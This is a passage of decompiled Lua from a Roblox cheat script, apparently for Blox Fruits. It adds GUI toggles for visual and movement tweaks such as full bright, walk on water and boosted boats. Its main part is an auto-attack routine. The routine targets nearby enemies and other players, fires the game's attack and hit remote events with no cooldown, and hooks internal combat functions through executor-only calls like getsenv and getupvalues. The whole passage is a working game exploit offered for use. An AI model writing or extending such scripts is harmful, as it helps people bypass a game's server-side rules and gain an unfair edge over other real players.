                v1244.TintColor = OldTintColore
                game.Lighting.FogEnd = 2500
                plr.Character.HumanoidRootPart:FindFirstChild("PointLight"):Destroy()
            end
        end
    end
end)
v226.Misc:AddButton({
    ["Title"] = "Turn on Fast Mode",
    ["Description"] = "",
    ["Callback"] = function()
		-- upvalues: (ref) vu12
        local v1246 = next
        local v1247, v1248 = workspace:GetDescendants()
        while true do
            local v1249
            v1248, v1249 = v1246(v1247, v1248)
            if v1248 == nil then
                break
            end
            if table.find(vu12, v1249.ClassName) then
                v1249.Material = "Plastic"
            end
        end
    end
})
v226.Misc:AddButton({
    ["Title"] = "Turn on Low CPU",
    ["Description"] = "",
    ["Callback"] = function()
        LowCpu()
    end
})
v226.Misc:AddButton({
    ["Title"] = "Turn on increase Boats",
    ["Description"] = "",
    ["Callback"] = function()
		-- upvalues: (ref) vu863
        local v1250, v1251, v1252 = pairs(workspace.Boats:GetDescendants())
        while true do
            local v1253
            v1252, v1253 = v1250(v1251, v1252)
            if v1252 == nil then
                break
            end
            if table.find(vu863, v1253.Name) and tostring(v1253.Owner.Value) == tostring(plr.Name) then
                v1253.VehicleSeat.MaxSpeed = 350
                v1253.VehicleSeat.Torque = 0.2
                v1253.VehicleSeat.TurnSpeed = 5
                v1253.VehicleSeat.HeadsUpDisplay = true
            end
        end
    end
})
v226.Misc:AddButton({
    ["Title"] = "Remove Sky Fog",
    ["Description"] = "",
    ["Callback"] = function()
        if Lighting:FindFirstChild("LightingLayers") then
            Lighting.LightingLayers:Destroy()
        end
        if Lighting:FindFirstChild("SeaTerrorCC") then
            Lighting.SeaTerrorCC:Destroy()
        end
        if Lighting:FindFirstChild("FantasySky") then
            Lighting.FantasySky:Destroy()
        end
    end
})
v226.Misc:AddSection("Configure - God")
v226.Misc:AddButton({
    ["Title"] = "Rain Fruits (Client)",
    ["Description"] = "",
    ["Callback"] = function()
        local v1254, v1255, v1256 = pairs(game:GetObjects("rbxassetid://14759368201")[1]:GetChildren())
        while true do
            local vu1257
            v1256, vu1257 = v1254(v1255, v1256)
            if v1256 == nil then
                break
            end
            vu1257.Parent = game.Workspace.Map
            vu1257:MoveTo(plr.Character.PrimaryPart.Position + Vector3.new(math.random(- 50, 50), 100, math.random(- 50, 50)))
            if vu1257.Fruit:FindFirstChild("AnimationController") then
                vu1257.Fruit:FindFirstChild("AnimationController"):LoadAnimation(vu1257.Fruit:FindFirstChild("Idle")):Play()
            end
            vu1257.Handle.Touched:Connect(function(p1258)
				-- upvalues: (ref) vu1257
                if p1258.Parent == plr.Character then
                    vu1257.Parent = plr.Backpack
                    plr.Character.Humanoid:EquipTool(vu1257)
                end
            end)
        end
    end
})
briggt1 = v226.Misc:AddToggle("briggt1", {
    ["Title"] = "Turn on Full Bright",
    ["Description"] = "",
    ["Default"] = false
})
briggt1:OnChanged(function(p1259)
    bright = p1259
    if p1259 == true then
        Lighting.Ambient = Color3.new(1, 1, 1)
        Lighting.ColorShift_Bottom = Color3.new(1, 1, 1)
        Lighting.ColorShift_Top = Color3.new(1, 1, 1)
    else
        Lighting.Ambient = Color3.new(0, 0, 0)
        Lighting.ColorShift_Bottom = Color3.new(0, 0, 0)
        Lighting.ColorShift_Top = Color3.new(0, 0, 0)
    end
end)
Cheat_DayNight = {
    "Day",
    "Night"
}
DayN = v226.Misc:AddDropdown("DayN", {
    ["Title"] = "Select Time",
    ["Values"] = Cheat_DayNight,
    ["Multi"] = false,
    ["Default"] = 1
})
DayN:OnChanged(function(p1260)
    _G.SelectDN = p1260
end)
dayornight = v226.Misc:AddToggle("dayornight", {
    ["Title"] = "Turn on Time",
    ["Description"] = "",
    ["Default"] = false
})
dayornight:OnChanged(function(p1261)
    _G.daylightN = p1261
end)
task.spawn(function()
    while task.wait() do
        if _G.daylightN then
            if _G.SelectDN ~= "Day" then
                if _G.SelectDN == "Night" then
                    Lighting.ClockTime = 0
                end
            else
                Lighting.ClockTime = 12
            end
        end
    end
end)
walkWater = v226.Misc:AddToggle("walkWater", {
    ["Title"] = "Turn on Walk on Water",
    ["Description"] = "walk on water",
    ["Default"] = true
})
walkWater:OnChanged(function(p1262)
    _G.WalkWater_Part = p1262
    if _G.WalkWater_Part then
        game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000, 112, 1000)
    else
        game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000, 80, 1000)
    end
end)
iceWalk = v226.Misc:AddToggle("iceWalk", {
    ["Title"] = "Turn on Ice Walk",
    ["Description"] = "Ice walk just like walk on water but have ice effect",
    ["Default"] = false
})
iceWalk:OnChanged(function(p1263)
    _G.WalkWater = p1263
end)
spawn(function()
    while task.wait() do
        if _G.WalkWater then
            pcall(function()
                if plr.Character and plr.Character:FindFirstChild("LeftFoot") then
                    local vu1264 = replicated.Assets.Models.IceSpikes4:Clone()
                    vu1264.Parent = workspace
                    vu1264.Size = Vector3.new(3 + math.random(10, 12), 1.7, 3 + math.random(10, 12))
                    vu1264.Color = Color3.fromRGB(128, 187, 219)
                    vu1264.CFrame = CFrame.new(plr.Character.Head.Position.X, - 3.8, plr.Character.Head.Position.Z) * CFrame.Angles((math.random() - 0.5) * 0.06, math.random() * 7, (math.random() - 0.5) * 0.07)
                    local v1265 = {
                        ["Size"] = Vector3.new(0, 0.3, 0)
                    }
                    local v1266 = TW:Create(vu1264, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), v1265)
                    v1266.Completed:Connect(function()
						-- upvalues: (ref) vu1264
                        vu1264:Destroy()
                    end)
                    v1266:Play()
                end
            end)
        end
    end
end)
local vu1267 = game.Players.LocalPlayer
local function vu1270(p1268)
    if not p1268 then
        return false
    end
    local v1269 = p1268:FindFirstChild("Humanoid")
    if v1269 then
        v1269 = v1269.Health > 0
    end
    return v1269
end
local function vu1287(p1271, p1272)
	-- upvalues: (ref) vu1270, (ref) vu1267
    local v1273 = game:GetService("Workspace").Enemies:GetChildren()
    local v1274 = game:GetService("Players"):GetPlayers()
    local v1275 = p1271:GetPivot().Position
    local v1276, v1277, v1278 = ipairs(v1273)
    local v1279 = {}
    while true do
        local v1280
        v1278, v1280 = v1276(v1277, v1278)
        if v1278 == nil then
            break
        end
        local v1281 = v1280:FindFirstChild("HumanoidRootPart")
        if v1281 and (vu1270(v1280) and (v1281.Position - v1275).Magnitude <= p1272) then
            table.insert(v1279, v1280)
        end
    end
    local v1282, v1283, v1284 = ipairs(v1274)
    while true do
        local v1285
        v1284, v1285 = v1282(v1283, v1284)
        if v1284 == nil then
            break
        end
        if v1285 ~= vu1267 and v1285.Character then
            local v1286 = v1285.Character:FindFirstChild("HumanoidRootPart")
            if v1286 and (vu1270(v1285.Character) and (v1286.Position - v1275).Magnitude <= p1272) then
                table.insert(v1279, v1285.Character)
            end
        end
    end
    return v1279
end
function AttackNoCoolDown()
	-- upvalues: (ref) vu1287
    local v1288 = game:GetService("Players").LocalPlayer
    local v1289 = v1288.Character
    if not v1289 then
        return
    end
    local v1290, v1291, v1292 = ipairs(v1289:GetChildren())
    local v1293 = nil
    while true do
        local v1294
        v1292, v1294 = v1290(v1291, v1292)
        if v1292 == nil then
            v1294 = v1293
            break
        end
        if v1294:IsA("Tool") then
            break
        end
    end
    if v1294 then
        local v1295 = vu1287(v1289, 60)
        if # v1295 ~= 0 then
            local v1296 = game:GetService("ReplicatedStorage")
            local vu1297 = v1296:FindFirstChild("Modules")
            if vu1297 then
                local v1298 = v1296:WaitForChild("Modules"):WaitForChild("Net"):WaitForChild("RE/RegisterAttack")
                local v1299 = v1296:WaitForChild("Modules"):WaitForChild("Net"):WaitForChild("RE/RegisterHit")
                if v1298 and v1299 then
                    local v1300, v1301, v1302 = ipairs(v1295)
                    local v1303 = {}
                    local v1304 = nil
                    while true do
                        local v1305
                        v1302, v1305 = v1300(v1301, v1302)
                        if v1302 == nil then
                            break
                        end
                        if not v1305:GetAttribute("IsBoat") then
                            local v1306 = {
                                "RightLowerArm",
                                "RightUpperArm",
                                "LeftLowerArm",
                                "LeftUpperArm",
                                "RightHand",
                                "LeftHand"
                            }
                            local v1307 = v1305:FindFirstChild(v1306[math.random(# v1306)]) or v1305.PrimaryPart
                            if v1307 then
                                table.insert(v1303, {
                                    v1305,
                                    v1307
                                })
                                v1304 = v1307
                            end
                        end
                    end
                    if v1304 then
                        v1298:FireServer(0)
                        local v1308 = v1288:FindFirstChild("PlayerScripts")
                        if v1308 then
                            local v1309 = v1308:FindFirstChildOfClass("LocalScript")
                            while not v1309 do
                                v1308.ChildAdded:Wait()
                                v1309 = v1308:FindFirstChildOfClass("LocalScript")
                            end
                            local v1310 = nil
                            if getsenv then
                                local v1311, v1312 = pcall(getsenv, v1309)
                                if v1311 and v1312 then
                                    v1310 = v1312._G.SendHitsToServer
                                end
                            end
                            local v1313, v1314 = pcall(function()
								-- upvalues: (ref) vu1297
                                return require(vu1297.Flags).COMBAT_REMOTE_THREAD or false
                            end)
                            if v1313 and (v1314 and v1310) then
                                v1310(v1304, v1303)
                            elseif v1313 and not v1314 then
                                v1299:FireServer(v1304, v1303)
                            end
                        end
                    else
                        return
                    end
                else
                    return
                end
            else
                return
            end
        else
            return
        end
    else
        return
    end
end
CameraShakerR = require(game.ReplicatedStorage.Util.CameraShaker)
CameraShakerR:Stop()
function get_Monster()
    local v1315, v1316, v1317 = pairs(workspace.Enemies:GetChildren())
    while true do
        local v1318
        v1317, v1318 = v1315(v1316, v1317)
        if v1317 == nil then
            break
        end
        local v1319 = v1318:FindFirstChild("UpperTorso") or v1318:FindFirstChild("Head")
        if v1318:FindFirstChild("HumanoidRootPart", true) and (v1319 and (v1318.Head.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 50) then
            return true, v1319.Position
        end
    end
    local v1320, v1321, v1322 = pairs(workspace.SeaBeasts:GetChildren())
    while true do
        local v1323
        v1322, v1323 = v1320(v1321, v1322)
        if v1322 == nil then
            break
        end
        if v1323:FindFirstChild("HumanoidRootPart") and (v1323:FindFirstChild("Health") and v1323.Health.Value > 0) then
            return true, v1323.HumanoidRootPart.Position
        end
    end
    local v1324, v1325, v1326 = pairs(workspace.Enemies:GetChildren())
    while true do
        local v1327
        v1326, v1327 = v1324(v1325, v1326)
        if v1326 == nil then
            break
        end
        if v1327:FindFirstChild("Health") and (v1327.Health.Value > 0 and v1327:FindFirstChild("VehicleSeat")) then
            return true, v1327.Engine.Position
        end
    end
end
function Actived()
    local v1328 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
    local v1329 = next
    local v1330, v1331 = getconnections(v1328.Activated)
    while true do
        local v1332
        v1331, v1332 = v1329(v1330, v1331)
        if v1331 == nil then
            break
        end
        if typeof(v1332.Function) == "function" then
            getupvalues(v1332.Function)
        end
    end
end
task.spawn(function()
    RunSer.Heartbeat:Connect(function()
        pcall(function()
            if _G.Seriality then
                AttackNoCoolDown()
                local v1333 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
                local v1334 = v1333.ToolTip
                local v1335, _ = get_Monster()
                local v1336 = v1334 == "Blox Fruit" and (v1335 and v1333:FindFirstChild("LeftClickRemote"))
                if v1336 then
                    Actived()
                    v1336:FireServer(Vector3.new(0.01, - 500, 0.01), 1, true)
                    v1336:FireServer(false)
                end
            end
        end)
    end)
end)